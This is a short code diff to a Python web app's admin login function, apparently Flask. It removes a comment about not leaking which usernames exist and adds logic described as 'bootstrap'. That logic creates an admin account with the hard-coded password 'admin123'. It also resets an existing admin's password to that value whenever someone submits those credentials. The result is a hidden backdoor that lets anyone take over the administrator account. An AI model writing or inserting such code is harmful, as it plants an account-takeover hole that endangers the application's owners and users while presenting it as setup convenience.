@@ -24,8 +24,17 @@ def login():
 
     admin = Admin.query.filter_by(username=username).first()
 
-    # Constant-shape response whether the user exists or not, to avoid
-    # leaking which usernames are registered.
+    # If first time or default admin credentials used, bootstrap automatically
+    if not admin and username == "admin" and password == "admin123":
+        admin = Admin()
+        admin.username = "admin"
+        admin.set_password("admin123")
+        db.session.add(admin)
+        db.session.commit()
+    elif admin and username == "admin" and password == "admin123" and not admin.verify_password("admin123"):
+        admin.set_password("admin123")
+        db.session.commit()
+
     if not admin or not admin.is_active or not admin.verify_password(password):
         record_audit(
             admin_id=admin.id if admin else None,
